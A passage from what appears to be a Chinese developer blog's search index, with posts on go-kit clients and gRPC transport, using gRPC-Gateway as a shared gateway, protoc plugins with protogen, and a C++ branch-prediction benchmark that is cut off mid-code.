svc = stringService{} svc = loggingMiddleware{logger, svc} // ...  uppercaseHandler := httptransport.NewServer( makeUppercaseEndpoint(svc), // ... \t) }   客户端实现 客户端实现可以很简单，同样有很强的扩展性。比如说可以结合服务发现、负载均衡、频率限制、熔断器实现一个功能强大的客户端。\n先从简单的开始。一般考虑客户端实现的话，会准备一个特殊的结构来保存服务的 Endpoint，再对这个结构实现服务定义的接口。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  // https://github.com/go-kit/examples/blob/master/addsvc/pkg/addendpoint/set.go  // Set collects all of the endpoints that compose an add service. It\u0026#39;s meant to // be used as a helper struct, to collect all of the endpoints into a single // parameter. type Set struct { SumEndpoint endpoint.Endpoint ConcatEndpoint endpoint.Endpoint } // Sum implements the service interface, so Set may be used as a service. // This is primarily useful in the context of a client library. func (s Set) Sum(ctx context.Context, a, b int) (int, error) { resp, err := s.SumEndpoint(ctx, SumRequest{A: a, B: b}) if err != nil { return 0, err } response := resp.(SumResponse) return response.V, response.Err } // ... 略   这么做的好处是可以像是调用 Go 方法一样去调用 RPC 函数，比起 grpc 一类的调用方式来说更直观了。\n客户端的 Endpoint 的构造方式和服务器不一样，隐藏在 Endpoint 背后的不是本地代码，而是一个网络请求。\n1 2 3 4 5 6 7 8 9 10  // Each individual endpoint is an http/transport.Client (which implements // endpoint.Endpoint) that gets wrapped with various middlewares. If you // made your own client library, you\u0026#39;d do this work there, so your server // could rely on a consistent set of client behavior. var sumEndpoint = httptransport.NewClient( \u0026#34;POST\u0026#34;, copyURL(u, \u0026#34;/sum\u0026#34;), encodeHTTPGenericRequest, decodeHTTPSumResponse, ).Endpoint()   github.com/go-kit/kit/transport 这个包提供了很多有用的助手函数来帮助构造 Endpoint ，以及黏合服务端的 Endpoint 到传输层代码。（PS：请回顾前文中使用的 httptransport.NewServer）\n服务发现 参考 apigateway 的代码。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  // Each method gets constructed with a factory. Factories take an // instance string, and return a specific endpoint. In the factory we // dial the instance string we get from Consul, and then leverage an // addsvc client package to construct a complete service. We can then // leverage the addsvc.Make{Sum,Concat}Endpoint constructors to convert // the complete service to specific endpoint. var ( tags = []string{} passingOnly = true endpoints = addendpoint.Set{} instancer = consulsd.NewInstancer(client, logger, \u0026#34;addsvc\u0026#34;, tags, passingOnly) ) { factory := addsvcFactory(addendpoint.MakeSumEndpoint, tracer, zipkinTracer, logger) endpointer := sd.NewEndpointer(instancer, factory, logger) balancer := lb.NewRoundRobin(endpointer) retry := lb.Retry(*retryMax, *retryTimeout, balancer) endpoints.SumEndpoint = retry }   总得来说，go kit 的服务发现机制靠客户端以特定的方式构造 Endpoint ，这和反向代理或者 side-car 代理实现的服务发现不一样。\n比如说 kubernetes 的 ClusterIP 基于 kube-proxy，后端有多个 POD 的时候 kube-proxy 会自动进行负载均衡，但算法是 kube-proxy 实现决定的，不可依赖。\n再比如 nginx 也能一定程度实现服务发现和负载均衡。\n再比如，linkerd 这样的 service mesh，非侵入，提供负载均衡、服务发现、重试这些功能。\ngo kit 的工具箱里提供的是客户端的负载均衡机制。上图里的代码可以用下图表示。\n多传输层实现 这里尝试实现 http 和 grpc 两种 rpc 传输层协议。首先为了保证最大化复用代码，在 http 实现中定义的结构和 endpoint 肯定是要复用起来的，不然每个传输层都来一次的话没codegen非得手指敲断不可。\n先提取 makeXXXEndpoint 代码和 XXXRequest 这样的结构到单独的文件里。\n思路上部分参考的 gokit 案例中 addsvc，链接。\nproto 文件如下。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  // play/stringsvc/transport/pb/stringsvc.proto syntax = \u0026#34;proto3\u0026#34;;option go_package = \u0026#34;play/stringsvc/transport/pb\u0026#34;;message UppercaseRequest { string s = 1; }message UppercaseResponse { string v = 1; }message CountRequest { string s = 1; }message CountResponse { int32 n = 1; }service StringService { rpc Uppercase(UppercaseRequest) returns (UppercaseResponse); rpc Count(CountRequest) returns (CountResponse);}  然后使用 protoc 生成 go 源码，具体参考 gRPC 的官方文档。继续下一步之前要先了解 go 语言的 gRPC 服务框架在一般情况下怎么实现。同样建议直接看文档。简单说就是写一个结构，实现 protoc 根据你的 proto 文件生成的接口，最后调用注册方法把你的实现注册到 gRPC 服务器上就可以了。\n再考虑请求进入我们的服务代码要经过的流程，gRPC 接口的实现要做事情其实就是把 proto 定义的结构转换成我们之前定义的结构，再调用之前定义的 Endpoint 。\n其中对请求编解码是个很无聊的过程，字段一一赋值即可。endpoint 继续复用先前 http 的版本。gRPC 实现比较取巧，我们把所有 Endpoint 放到一个结构里保存，然后实现 gRPC 的接口。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  import ( \u0026#34;context\u0026#34; \u0026#34;play/stringsvc\u0026#34; \u0026#34;play/stringsvc/transport/pb\u0026#34; grpctransport \u0026#34;github.com/go-kit/kit/transport/grpc\u0026#34; ) type set struct { *pb.UnimplementedStringServiceServer uppercase grpctransport.Handler count grpctransport.Handler } func NewGRPCServer(svc stringsvc.StringService) *set { return \u0026amp;set{ uppercase: grpctransport.NewServer(MakeUppercaseEndpoint(svc), decodeUppercaseRequestGRPC, encodeUppercaseResponseGRPC), count: grpctransport.NewServer(MakeCountEndpoint(svc), decodeCountRequestGRPC, encodeCountResponseGRPC), } } func (s *set) Uppercase(ctx context.Context, req *pb.UppercaseRequest) (*pb.UppercaseResponse, error) { _, resp, err := s.uppercase.ServeGRPC(ctx, req) if err != nil { return nil, err } return resp.(*pb.UppercaseResponse), nil } func (s *set) Count(ctx context.Context, req *pb.CountRequest) (*pb.CountResponse, error) { _, resp, err := s.count.ServeGRPC(ctx, req) if err != nil { return nil, err } return resp.(*pb.CountResponse), nil }   这里利用了一个 github.com/go-kit/kit/transport/grpc 的帮助结构，grpctransport.NewServer 创建的 grpctransport.Server。这个结构的用途和 httptransport.NewServer一样，本质上是一个适配器，把 gRPC 的输入适配到我们定义的服务接口。理论上来说不用这玩意儿也没事，但实现代码里就要显式调用 Decode和Encode。从解耦的角度来说这种设计会更好。\n总结 之所以说 gokit 大概算是框架，是因为 gokit 提供的这些工具其实有一套自己的最佳实践，但并不强迫遵循。比如 transport 并不是一定要用 gokit 的 transport ，完全可以自己写 http.Handler ，把 encode/decode 写到一起。也可以把其他方式编写的 RPC 封装成 Endpoint，获得 gokit 提供的一系列支持。\ngokit 提供了很多有用的工具，解决一些诸如服务发现、熔断器、分布式跟踪和可观测性这样的问题。gokit 的案例代码示范的实践方式也很有启发性。\n","date":"2022-03-01T12:30:00+08:00","permalink":"https://nnnewb.github.io/blog/p/go-kit-note/","title":"go-kit 笔记"},{"content":"前言 众所周知，API网关是微服务架构的重要组件，起到一个整流过滤的作用。虽然 gRPC-Gateway 要啥没啥，和 API 网关的模式也扯不上太多关系，但总之先起个高调。\n然后就是真正遇到的问题了。在旧的架构里，gRPC-Gateway 的用法，是对每个需要暴露 HTTP 服务的 gRPC 服务都起一个对应的 gRPC-Gateway 。最早的做法是 gRPC-Gateway 服务单独作为一个 POD ，gRPC 服务实现也单独一个 POD 。后来我改成了 Gateway 和 服务在同一个 POD 内，起两个 container 。\n之前的做法都存在一个问题，就是 gRPC-Gateway 要分配少量的 CPU 和内存配额，虽然每个 gRPC-Gateway 服务分到的内存和CPU都很少，但架不住服务多，内存和 CPU 的配额都占用了不少，实际用到的少得可怜，大部分配额都是浪费。\n下面具体分析下怎么把 gateway 单独提取成一个 POD，给所有 gRPC 服务当网关，同时保持负载均衡发挥作用，提供无缝扩容。\n实现网关 官方demo 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  // Create a client connection to the gRPC server we just started // This is where the gRPC-Gateway proxies the requests conn, err := grpc.DialContext( context.Background(), \u0026#34;0.0.0.0:8080\u0026#34;, grpc.WithBlock(), grpc.WithTransportCredentials(insecure.NewCredentials()), ) if err != nil { log.Fatalln(\u0026#34;Failed to dial server:\u0026#34;, err) } gwmux := runtime.NewServeMux() // Register Greeter err = helloworldpb.RegisterGreeterHandler(context.Background(), gwmux, conn) if err != nil { log.Fatalln(\u0026#34;Failed to register gateway:\u0026#34;, err) } gwServer := \u0026amp;http.Server{ Addr: \u0026#34;:8090\u0026#34;, Handler: gwmux, } log.Println(\u0026#34;Serving gRPC-Gateway on http://0.0.0.0:8090\u0026#34;) log.Fatalln(gwServer.ListenAndServe())   核心逻辑在这两行：\n1 2 3 4 5 6  gwmux := runtime.NewServeMux() // Register Greeter err = helloworldpb.RegisterGreeterHandler(context.Background(), gwmux, conn) if err != nil { log.Fatalln(\u0026#34;Failed to register gateway:\u0026#34;, err) }   gwmux是 gRPC-Gateway 的运行时 mux 实例，可以理解成路由。 标准库的 http 包也有自己的 mux ，但 gRPC-Gateway 项目自己实现了一个。看到 gwmux应该就能想到这肯定是注册路由，理论上来说——如果你有多个 gRPC 服务，而且 url 没有冲突的话，注册多个服务到路由上应该是没有问题的。\n所以剩下的问题就是这个 RegisterGreeterHandler 内是不是我们预期的那样，类似 mux 注册路由的用法？\nRegisterXXXHandlerClient 实现 顺着 RegisterXXXHandler很快就能找到实现，RegisterXXXHandlerClient。Handle的用法正如预期的那样，是一个类似 http.ServeMux 的对象。处理函数里的逻辑很清晰。\n函数体可以简单划分成两部分：\n 构造和发送请求  根据请求的 Content-Type 选择 Marshaler 。 构造请求上下文，从HTTP请求里提取grpc-metadata开头的元数据到 context 里。 request_XXX_0 反序列化 HTTP 请求体到 protobuf 生成的结构，并发送请求。   构造和返回响应  从响应元数据里构造上下文 构造和返回 HTTP 响应    整个流程是无状态也和 gwmux 本身无绑定的。换言之，理论上来说完全可以把所有 gRPC-Gateway 生成的 Register 函数注册到同一个 gwmux 上。\nBackend和注册 出于清晰化的考虑，Gateway 服务的构造过程我写成了 Builder 模式。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  type registerHandlerFn func(ctx context.Context, mux *runtime.ServeMux, conn *grpc.ClientConn) (err error) type GRPCBackend struct { RegisterHandlerFunc registerHandlerFn BackendAddr string } func (s *DonviewGRPCGatewayServer) Serve() error { mux := runtime.NewServeMux(s.muxOptions...) for _, backend := range s.backends { conn, err := grpc.DialContext(context.TODO(), backend.BackendAddr, s.dialOptions...) if err != nil { return err } err = backend.RegisterHandlerFunc(context.TODO(), mux, conn) if err != nil { return err } } var handler http.Handler = mux for _, wrapperFn := range s.httpHandlerWrappers { handler = wrapperFn(handler) } return http.ListenAndServe(fmt.Sprintf(\u0026#34;0.0.0.0:%d\u0026#34;, s.port), handler) }   所有 gRPC 后端被注册到 s.backends ，在开始服务的时候调用 Serve 函数，把 gRPC 服务注册到 mux 里。因为事前确保了服务路由不会重叠，理论上来说注册完就能用。\n负载均衡 最初的架构里，一个 gRPC-Gateway 服务对应一个 gRPC 服务，请求进入服务的过程是从云服务提供商的 LB =\u0026gt; kubernetes service (load balancer) =\u0026gt; gateway =\u0026gt; ClusterIP =\u0026gt; gRPC Server 。\n后来改成一个 POD 包含 gateway 和 gRPC 两个 container 后，gateway 访问 gRPC 服务就不在经过 ClusterIP 这一层代理了，路径变成云服务商的 LB =\u0026gt; kubernetes service (load balancer) =\u0026gt; gateway =\u0026gt; gRPC Server 。\n最后是现在的版本，网关统一成一个容器，路径和上述一样。\n三者的区别在于负载均衡的时机。Kubernetes 的 ClusterIP 是同样具备负载均衡能力的，最初架构中负载均衡一共进行了三次，从云服务商的LB到主机端口（kubernetes），kubernetes再次负载均衡，转发到 gateway。gateway再经由 ClusterIP 转发至 gRPC 服务，每一次转发都经历一次负载均衡，分别提供了虚拟主机的扩容能力、gateway服务的扩容能力、gRPC服务的扩容能力。\n第二版修改去掉了 gateway 到 gRPC 服务的负载均衡，变成了直连，延迟表现上理论上来说会有改善，但我没做过基准测试，所以这个“理论上”也只是凭感觉说。但可以明确的是 gateway 会额外占据资源配额，造成浪费，不好说值不值，个人感觉没太大意义。\n第三版，统一了 gateway，还是三次负载均衡。不过Gateway对资源配额的使用效率会更好一点，依然保持了主机、gateway、gRPC 服务的可伸缩性。\n总结 单从理论上来说这样设计应该是 OK 的，但是 gRPC-Gateway 官方对负载均衡没有说法，对能不能注册多个 gRPC 服务到一个 mux 上也没有官方的文档说明，很难说这帮人能不能保证向后兼容，万一之后的版本不支持注册到一个 mux 上了，到时候改起来就麻烦了，比较坏的情况就是你得自己写一个 protoc-gen-gateway 这样的玩意儿来生成一个自己的网关。\n此外还有一个缺陷，gRPC-Gateway 到 gRPC Server 的负载均衡由 Kubernetes ClusterIP 提供，但是 ClusterIP 的负载均衡算法是 Round Robin/Random ，并不支持根据负载或其他维度的测量数据来决定如何均衡负载，未来如果需要根据负载情况分发请求，可能还得在网关到 gRPC 服务之间加个负载均衡组件，再提供一个服务发现/注册中心来帮助调度。\n","date":"2022-02-23T17:30:00+08:00","permalink":"https://nnnewb.github.io/blog/p/grpc-gateway-used-as-multiple-grpc-server-gateway/","title":"gRPC-Gateway 用作多个 gRPC 服务的网关"},{"content":"前言 最大的问题其实是 proto 直接生成的 swagger 不好用，过去的 gRPC 写法只在服务端，客户端没享受到静态类型定义的接口的快乐，而且手工写的文档还有一堆很无语的问题，整个系统维护起来蛋疼无比。\n后来解决办法也简单，代码生成，缺什么生成什么，先后经历了用 go + proto解析写改成用 typescript 写，再改回 go + protogen，一番折腾下来最后还是用 protogen 最简单舒服。\n这篇博客主要就是介绍下 protogen 配上 go 模板能做到的事情。\nprotogen介绍 protogen的官方文档在这里，protogen是google官方protoc-gen-go插件使用的支持库，代码托管在github.com/protocolbuffers/protobuf-go 。可以通过 protoc-gen-go 的 main 包代码 初窥门径。\n不过在开始前，还得先了解下 protoc 插件是怎么工作的。从官方文档other languages and plugins摘录如下。\n protoc, the Protocol Buffers Compiler, can be extended to support new languages via plugins. A plugin is just a program which reads a CodeGeneratorRequest protocol buffer from standard input and then writes a CodeGeneratorResponse protocol buffer to standard output. These message types are defined in plugin.proto. We recommend that all third-party code generators be written as plugins, as this allows all generators to provide a consistent interface and share a single parser implementation.\n 简单地说，protoc插件从stdin读取一个protobuf消息，往stdout写一个protobuf消息。把protoc插件理解成服务器，protoc发送请求，插件返回响应，交互过程不经过网络，而是标准输入/输出，就这样。\n我也不想解释为什么不从零开始写了。protogen提供了相当完善的封装，很轻松就可以写出一个完整的 protoc 插件。\nHelloWorld 先来个惯例。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  package main import ( \u0026#34;log\u0026#34; \u0026#34;flags\u0026#34; \u0026#34;google.golang.org/protobuf/compiler/protogen\u0026#34; ) func main() { log.SetFlags(0) log.SetPrefix(\u0026#34;protoc-gen-hello: \u0026#34;) flags := flag.FlagSet{} protogen.Options{ParamFunc: flags.Set}.Run(Gen) } func Gen(plugin *protogen.Plugin) error { log.Printf(\u0026#34;Hello world\u0026#34;) return nil }   什么也不生成，就只是输出一句 Hello world。\n简单生成 一个简单的proto文件。\n1 2 3 4 5 6 7 8  syntax = \u0026#34;proto3\u0026#34;;option go_package = \u0026#34;play/proto\u0026#34;;message Hello { string name = 1; }message World { string greeting = 1; }service greeter { rpc SayHello(Hello) returns (World); }  输出文件里所有的结构、服务、RPC方法名称。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33  package main import ( \u0026#34;flag\u0026#34; \u0026#34;log\u0026#34; \u0026#34;google.golang.org/protobuf/compiler/protogen\u0026#34; ) func main() { log.SetFlags(0) log.SetPrefix(\u0026#34;protoc-gen-hello: \u0026#34;) flags := flag.FlagSet{} protogen.Options{ParamFunc: flags.Set}.Run(Gen) } func Gen(plugin *protogen.Plugin) error { for _, filename := range plugin.Request.FileToGenerate { file := plugin.FilesByPath[filename] for _, msg := range file.Messages { log.Printf(\u0026#34;message: %s\u0026#34;, msg.Desc.FullName()) } for _, svc := range file.Services { log.Printf(\u0026#34;service: %s\u0026#34;, svc.Desc.FullName()) for _, method := range svc.Methods { log.Printf(\u0026#34;method: %s\u0026#34;, method.Desc.FullName()) } } } return nil }   可以看出来使用非常简单，但需要注意的是 message 是可以嵌套的，message内还能定义message和enum，上面的例子没有处理。\n接下来我们把命令行输出改成输出到文件，让程序有点实际用途。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46  package main import ( \u0026#34;flag\u0026#34; \u0026#34;log\u0026#34; \u0026#34;path\u0026#34; \u0026#34;strings\u0026#34; \u0026#34;google.golang.org/protobuf/compiler/protogen\u0026#34; ) func main() { log.SetFlags(0) log.SetPrefix(\u0026#34;protoc-gen-hello: \u0026#34;) flags := flag.FlagSet{} protogen.Options{ParamFunc: flags.Set}.Run(Gen) } func Gen(plugin *protogen.Plugin) error { for _, filename := range plugin.Request.FileToGenerate { g := plugin.NewGeneratedFile(strings.ReplaceAll(path.Base(filename), \u0026#34;.proto\u0026#34;, \u0026#34;.md\u0026#34;), \u0026#34;\u0026#34;) g.P(\u0026#34;# API 文档\u0026#34;) g.P() g.P(\u0026#34;## 结构定义\u0026#34;) g.P() file := plugin.FilesByPath[filename] for _, msg := range file.Messages { log.Printf(\u0026#34;message: %s\u0026#34;, msg.Desc.FullName()) g.P(\u0026#34;### \u0026#34;, msg.Desc.Name()) g.P() } for _, svc := range file.Services { g.P(\u0026#34;## 服务 \u0026#34;, svc.Desc.FullName()) g.P() log.Printf(\u0026#34;service: %s\u0026#34;, svc.Desc.FullName()) for _, method := range svc.Methods { log.Printf(\u0026#34;method: %s\u0026#34;, method.Desc.FullName()) g.P(\u0026#34;### 接口 \u0026#34;, method.Desc.Name()) } } } return nil }   注意使用了 plugin.NewGeneratedFile而不是直接os.Open，因为这是protoc插件的约定之一。protoc插件系统允许插件提供insert point，让别的插件修改插件生成的代码。不过目前我们没有这种功能，但遵循约定的方式来编写代码总是没坏处的。\n代码里会有很多没看懂的东西，比如 Desc ，其实是Descriptor的缩写。Descriptor是一种设计模式，我自己的粗暴理解就是Descriptor“描述”对象的结构和属性，借助Descriptor来访问和修改对象。听起来像是反射，用起来也是反射的感觉。在 Python 里也有个 descriptor，Descriptor HowTo Guide，和这里的Descriptor有相似的地方，仅供参考。\n模板化 虽然也能直接在代码里用 g.P 完成生成工作，但是未免麻烦。g.P这个接口实话说我觉得不行，怎么不实现一个StringWriter。\n这里用模板最大的好处是能轻松地完成一大堆字符串拼接混合一些简单的逻辑的情况，如果用 go 代码实现会非常啰嗦。\n先展示下我使用的模板，代码太罗嗦就不贴了。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  {{ define \u0026#34;message-link\u0026#34; -}} {{ if .Message -}} ../../../{{ .Message.ParentFile.Path | base | replace \u0026#34;.proto\u0026#34; \u0026#34;\u0026#34; }}/types/{{ .Message.FullName | toString | replace \u0026#34;.\u0026#34; \u0026#34;_\u0026#34;}}/ {{- else if .Enum -}} ../../../{{ .Enum.ParentFile.Path | base | replace \u0026#34;.proto\u0026#34; \u0026#34;\u0026#34; }}/types/{{ .Enum.FullName | toString | replace \u0026#34;.\u0026#34; \u0026#34;_\u0026#34; }}/ {{- end }} {{- end -}} {{ define \u0026#34;message\u0026#34; -}} **JSON:** ```json {{ .Desc | GenerateExample }} ``` **字段说明:** |字段|类型|说明| |----|----|----| {{ range .Fields -}} |`{{- .Desc.Name }}`|[`{{ template \u0026#34;field-type\u0026#34; .Desc }}`]({{template \u0026#34;message-link\u0026#34; .Desc }})|{{ .Comments | InlineMarkdownDocString | default \u0026#34;*此字段没有文档注释*\u0026#34;}}| {{ end }} {{- end -}} # {{ .Desc.FullName | toString | replace \u0026#34;.\u0026#34; \u0026#34;_\u0026#34; }}  {{ template \u0026#34;message\u0026#34; . }}   最终生成结果就像是这样。\n总结 本身是个很简单的东西。原先用解析proto文件语法树再生成文档的方法不是不行，但一来第三方的解析库经常有不支持的语法和奇怪的bug，protoc本身又是事实标准，官方的 DSL Specification 文档就是个废物文档，连 option(http) {} 这样的都算是 specification 之外，还有 optional 在 proto3 还能用之类的让人想骂傻逼的问题。\n后来改成了 typescript + protobuf.js ，官方支持的稳定性一下子就好多了，但这个跑起来性能实在有点拉，而且 ts 版本用了 ejs 作为模板引擎，ejs的标签写起来罗嗦到不行，内嵌 js 的写法一时爽，爽完自己都快看不懂写了什么玩意儿了。\n最后换回 go+protogen，一下子就舒服多了。\n","date":"2022-02-21T16:32:00+08:00","permalink":"https://nnnewb.github.io/blog/p/protogen-code-generation/","title":"protogen代码生成"},{"content":"前言 还是从 Igor Ostrvsky 的博客里发现的一篇有意思的文章，Fast and slow if-statements: branch prediction in modern processors 开始。\n分支预测对性能的影响 介绍 分支预测器 - Wikipedia 我直接抄一段。\n 在计算机体系结构中，分支预测器（英语：Branch predictor）是一种数字电路，在分支指令执行结束之前猜测哪一路分支将会被执行，以提高处理器的指令流水线的性能。使用分支预测器的目的，在于改善指令流水线的流程，就像一家公司的员工提前预测公司所需要的东西，即交付不同单位进行准备工作，而那各个部门之间的等待交办的时间大大地缩短，整个公司的效率就会提高了。现代使用指令流水线处理器的性能能够提高，分支预测器对于现今的指令流水线微处理器获得高性能是非常关键的技术。\n 现代 CPU 的分支预测没有 Igor Ostrvsky 的博客里写的分支预测器那么傻了，实际上，那篇博客里的代码在 i5-6600 的环境下跑起来，TTFF或者TTTTFFFF甚至比TTTT还要快。那篇博客创作于 2010 年， 而 Skylake 架构在 2015 年替代 Broadwell 架构，而现在是 2022年， Intel 已经发布了 GoldenCove ，AMD 也要发 Zen 4了。内容过时不可避免。\n所以这篇博客主要还是聊一下分支预测对性能的影响，但大概总结不出 Igor Ostrvsky 的博客里的规律。顺带一提，不要随便针对分支预测优化，要是有人看了 Igor Ostrvsky 那篇博客费了老大功夫优化成连续 T/F 分支，换上新 CPU 之后性能还倒退这能找谁说理去。针对微架构分支预测失败回退做优化我还在爆栈上看到个回答很有意思，avoid stalling pipeline by calculating conditional early ，很难想到还能用这种办法榨干 CPU 的每一滴性能。\n基准测试 这个基准测试的主要目的是体现出分支预测失败对执行时间的影响，测试方法是喂 10MB 的随机 T/F ，为 T 时计数器 +1。除了输入数据外测试代码一样。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60  #include \u0026lt;iostream\u0026gt;#include \u0026lt;functional\u0026gt;#include \u0026lt;chrono\u0026gt;#include \u0026lt;stdlib.h\u0026gt;#include \u0026lt;vector\u0026gt;#include \u0026lt;cstdlib\u0026gt; using namespace std; using namespace std::chrono; void benchmark(const string name, uint32_t loops, function\u0026lt;void(void)\u0026gt; fn) { milliseconds sum = 0ms, lowest = 0ms, highest = 0ms; for (int i = 0; i \u0026lt; loops; i++) { auto start = system_clock::now(); fn(); auto stop = system_clock::now(); auto d = duration_cast\u0026lt;milliseconds\u0026gt;(stop - start); sum += d; lowest = lowest == 0ms ? d : min(lowest, d); highest = max(highest, d); } cout \u0026lt;\u0026lt; name; cout \u0026lt;\u0026lt; \u0026#34; avg: \u0026#34; \u0026lt;\u0026lt; sum.count() / loops \u0026lt;\u0026lt; \u0026#34;ms\u0026#34;; cout \u0026lt;\u0026lt; \u0026#34; best: \u0026#34; \u0026lt;\u0026lt; lowest.count() \u0026lt;\u0026lt; \u0026#34;ms\u0026#34;; cout \u0026lt;\u0026lt; \u0026#34; worst: \u0026#34; \u0026lt;\u0026lt; highest.count() \u0026lt;\u0026lt; \u0026#34;ms\u0026#34;; cout \u0026lt;\u0026lt; \u0026#34; total: \u0026#34; \u0026lt;\u0026lt; sum.count() \u0026lt;\u0026lt; \u0026#34;ms\u0026#34;; cout \u0026lt;\u0026lt; endl; } int main(void) { srand(duration_cast\u0026lt;seconds\u0026gt;(system_clock::now().time_since_epoch()).count()); vector\u0026lt;int\u0026gt; always_true, unpredictable; always_true.resize(1024 * 1024 * 10, 1); unpredictable.resize(1024 * 1024 * 10, 1); for (auto \u0026amp;i : unpredictable) { i = rand() % 2; } benchmark(\u0026#34;always true\u0026#34;, 100, [\u0026amp;always_true]() { int sum = 0; for (auto i : always_true) { if (i) { sum++; } } }); benchmark(\u0026#34;unpredictable\u0026#34;, 100, [\u0026amp;unpredictable]() { int sum = 0; for (auto i : unpredictable) { if (i) { sum++; } } }); return 0; }   使用 clang++ 编译\n1 2 3 4 5  # clang version 13.0.0 # Target: x86_64-pc-windows-msvc # Thread model: posix # InstalledDir: C:\\Program Files\\LLVM\\bin clang++.exe -m32 -O0 -g -std=c++20 .\\branch-prediction-1.cpp -o branch-prediction-1.exe   统计平均、最佳、最差耗时，输出结果如下。\n1 2  always true avg: 120ms best: 116ms worst: 246ms total: 12056ms unpredictable avg: 191ms best: 184ms worst: 265ms total: 19115ms   可以看到，数据量相同的情况下，输入数据是随机 T/F 的平均耗时比总为真的耗时高出 50%，总耗时多出 7 秒左右（差不多也是50%多一点）。可想而知，如果输入数据更有规律（比如前半段都是T后半段都是F），数据量不变的情况下，性能也会有相当不错的提高。\n顺便我还要说一下这个基准测试不够好，应该每个测试循环都生成一次随机数输入的。\n分支预测扮演的角色 这还得从CPU执行指令的过程说起。这里聊的 CPU 执行一条指令需要经过下面的步骤，称作流水线。计算机组成原理课应该有说。\n 取指 (fetch) 译码 (decode) 执行 (算数指令走 ALU) 访问主存 (Load/Store) 写回  更简化一点的话可以把ALU算数运算和访存都算作指令的“执行”阶段，CPU就是在不断循环执行这四个动作。\n流水线处理器为了充分利用硬件，在译码上一条指令时，就开始取指下一条指令了，执行速度可以是单周期处理器的很多倍。显然流水线越长，每个阶段的耗时越短，整体执行的效率就越高。\n如果指令一直按顺序执行，流水线只要不断加长加快就能获得更高的性能，但“分支”打破了这个美梦。一个简短的例子如下。\n1 2 3 4 5  loop: inc eax cmp eax,ebx jne loop call exit   CPU 从 cmp eax,ebx 开始，取指 jne loop。译码 jne loop 时，问题来了，接下来是取指 call exit 还是 inc eax？\n此时我们还不知道 cmp eax,ebx 的结果，CPU 能做的事情只有：傻等(stall)，或者猜测下一条要执行的指令是什么(predict)。\n现代处理器的流水线长度可以达到几十，如果 CPU 遇到需要上一条指令的结果来继续下一条指令就开始等，那么流水线就不得不闲置到上一条指令完成，结果就是分支指令的代价会是其他指令的几十倍，对循环语句来说是个噩耗。\n影响流水线效率的还有其他元素，比如说上面的 取值-译码-执行-写回 过程里，四个阶段的执行速度也是不同的。通常取值和译码的速度更慢，执行写回更快。如何尽可能让每个执行单元都不浪费时间等待，也是个难题。\n关于流水线，Perf IPC 以及 CPU 利用率 这篇文章感觉不错。\n继续说。既然让流水线退化到单周期不可取，那就瞎猜一个，先把流水线填满再说呗，反正不会比傻等更差了。于是就有了分支预测器：虽然是瞎猜，但尽可能猜得准一点总没坏处。\n减少分支预测失败的损失 实话说我不确定这个代价有多大，因为没法控制失败率，不知道现在正在用的 CPU 的分支预测器是怎么工作的。\n直接构造随机的 T/F 序列是一种办法，前面的基准测试已经验证了随机 T/F 干扰分支预测会产生接近 50% 的多余开销。那么有没有办法降低分支预测失败的损失呢？怎么让 CPU 更早发现到分支预测失败，减少要抛弃、清空的流水线长度？\n参考前面爆栈的链接 avoid stalling pipeline by calculating conditional early ，我简单写一个基准测试看看。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103  #include \u0026lt;iostream\u0026gt;#include \u0026lt;functional\u0026gt;#include \u0026lt;chrono\u0026gt;#include \u0026lt;vector\u0026gt;#include \u0026lt;cstdlib\u0026gt;#include \u0026lt;random\u0026gt; using namespace std; using namespace std::chrono; milliseconds time_it(function\u0026lt;void(void)\u0026gt; fn) { auto start = system_clock::now(); fn(); auto stop = system_clock::now(); return duration_cast\u0026lt;milliseconds\u0026gt;(stop - start); } void benchmark(const string name, uint32_t loops, function\u0026lt;void(void)\u0026gt; fn) { milliseconds sum = 0ms, lowest = 0ms, highest = 0ms; for (int i = 0; i \u0026lt; loops; i++) { auto d = time_it(fn); sum += d; lowest = lowest == 0ms ? d : min(lowest, d); highest = max(highest, d); } cout \u0026lt;\u0026lt; name; cout \u0026lt;\u0026lt; \u0026#34; avg: \u0026#34; \u0026lt;\u0026lt; sum.count() / loops \u0026lt;\u0026lt; \u0026#34;ms\u0026#34;; cout \u0026lt;\u0026lt; \u0026#34; best: \u0026#34; \u0026lt;\u0026lt; lowest.count() \u0026lt;\u0026lt; \u0026#34;ms\u0026#34;; cout \u0026lt;\u0026lt; \u0026#34; worst: \u0026#34; \u0026lt;\u0026lt; highest.count() \u0026lt;\u0026lt; \u0026#34;ms\u0026#34;; cout \u0026lt;\u0026lt; \u0026#34; total: \u0026#34; \u0026lt;\u0026lt; sum.count() \u0026lt;\u0026lt; \u0026#34;ms\u0026#34;; cout \u0026lt;\u0026lt; endl; } typedef struct my_node { int value; my_node *next; my_node() : value(0), next(nullptr) {} } my_node; typedef struct my_list { int length; my_node *head; my_node *last; my_list() : length(0), head(nullptr), last(nullptr) {} void append() { if (head == nullptr) { head = new my_node(); last = head; } else { 